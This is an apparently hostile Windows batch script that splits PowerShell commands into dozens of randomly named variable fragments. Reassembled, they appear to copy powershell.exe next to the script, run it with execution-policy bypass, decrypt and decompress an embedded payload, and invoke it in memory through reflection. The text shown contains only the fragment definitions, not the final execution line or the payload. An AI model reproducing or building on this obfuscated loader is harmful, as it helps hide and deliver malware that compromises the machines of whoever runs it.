@echo off
set "fTYYzmVqaF=he"
set "WYkpgTVEgw=Sy"
set "YMvibDDrbJ=do"
set "TtlmLemGPk=:\"
set "TbQGjwKhJI=1."
set "dGgJYQCHIt=rS"
set "qIgiUuNEUu=we"
set "SgByQVisnZ=Wi"
set "RMQeivIyao=Po"
set "GNkJMToLEW=we"
set "PYzqtHYFqq=in"
set "MKEpNPsVLo=rs"
set "CSnDkPpjnb= /"
set "mXklnlGhgr=\v"
set "giNVYHYise=\W"
set "uiOtVoowzT=32"
set "zwEoAYosqC=0\"
set "LsLXXtuVLO=st"
set "YoKuhiJNLo=po"
set "pwJWxfrxoE= C"
set "ipaEZPUjiX=em"
set "fYwSIZBeGr=ws"
set "MWvubMlVCH=ll"
set "ExteEuzyOe=y "
set "PObwrsVGqi=xe"
set "LdPsXFWakG=co"
set "nyLFNbNTsJ=ow"
set "vYgeNmpVAq=py"
set "JCOtPnKuGr=.e"
set "WnRDsErvya=he"
set "yayGgptTVS=nd"
set "UfrNtwSnXn=ll"
set "ZJfpxjUlfB=s\"
set "vCuNyuYeSF= %~dp0"
set "LsfzMiTWfI=cd"
set "lvTiuPMQmh=PBV."
set "YXeRcSVPnI=e]::"
set "cmDyFKflbb=rans"
set "ChqrPuIcvH=Obje"
set "DizXoBIuQm=flec"
set "jsrEXyzWwn=nage"
set "UezbeYPSWe=OtiJ"
set "KbpxFBUMYA=NQ);"
set "jDxJqLjJrL=106u"
set "yipebVHurd=tem."
set "QuIZtHinGD=pres"
set "PbmyGhAOyj= = N"
set "ZXGxPmSLnG=$hcY"
set "wOqHKJgTaI=join"
set "ylzBooCQKd=gjYA"
set "KyPNdfWaVh=ion."
set "FtYykTZTAz=m.Re"
set "iWXYGeThQT=pher"
set "ZPocjJquwW=; };"
set "kOwHYEfhdz=ss -"
set "RYgtuqDsov=oint"
set "VLJXbrfzWd=oryS"
set "SDxVOlIioR=);$v"
set "MWrDnTVBEK=).Sp"
set "cZtjGQLKFN=r.Pa"
set "TNxOyMGCmL=iPir"
set "fVYmAEAMBe= '')"
set "XTzeceEJuo=)))"
set "HGyqZWAscx=NQ ="
set "dZOAMNiaIs=Obje"
set "tIxqKiUgqv=e = "
set "FurbMMELMt=-1.."
set "YwhtVJJdXg=-Obj"
set "CRcGFDqrRp=[IO."
set "bWXLNlbVcn= '')"
set "FEThAIFahS=iPir"
set "xySnvJYFGO=ke($"
set "pGneEzgzYO=ypto"
set "JNBAPRAkiA=tem."
set "xpEPEcdZAy=ionM"
set "GHKrmZoOSb=);$v"
set "QUNyIXjZOR=-nop"
set "JOpJLMOxLJ===')"
set "bAfoUiXqRl=, $o"
set "wuHhonlbOI=cYNQ"
set "YuHZUlKACI=s) {"
set "GdpPZABfhx=Invo"
set "qFVFzBSMgr=Stre"
set "zvOCzYAydW=bypa"
set "jqJxnAmzib=ring"
set "tfzKzubjVk= [Sy"
set "zYxAVMtubK=iPir"
set "qzNakhOrtp=ay()"
set "PnqkzBRYuo=:: '"
set "YtLdVKhbKj=V = "
set "IAZrZwkFle=$USY"
set "zzhertIqVz=.Com"
set "ImUhOjbZFm=;$Ot"
set "nXFTtCBLcf=.Cry"
set "bXtEtCKFQH='[-1"
set "FUNEYJsTDJ=.Dis"
set "RnXleeWiYi=ptog"
set "SXhKdPTKob=V.Su"
set "ONbWlFfLEZ=F'[-"
set "KxmdCmiBwC=ddin"
set "BDwVWhXRcN=PgMf"
set "jDcSwFjotN=zzt "
set "hQSzsJwKHv=raph"
set "nAPQSkEDGl=raph"
set "ZQYkCZAaMi=ect "
set "wbmVFRxGWl=ress"
set "GnOGCrYDcG=vert"
set "XuPlTshnuX=tsWi"
set "zvDpRmsfDX=ach "
set "cdhezkbbEc=7;$v"
set "zIAjuQavFp= [st"
set "SYFojientR=trea"
set "rAuHPqjznj=] -j"
set "NnrOjtJjVS=Ks ="
set "tgQPGYpfum=null"
set "RAZpRtFGqC=fm.D"
set "kUSNCJeELs=vzDv"
set "fLbEcTOMkl=YxVw"
set "BPFEHOqGif=tem."
set "JZBkNBeCso= if "
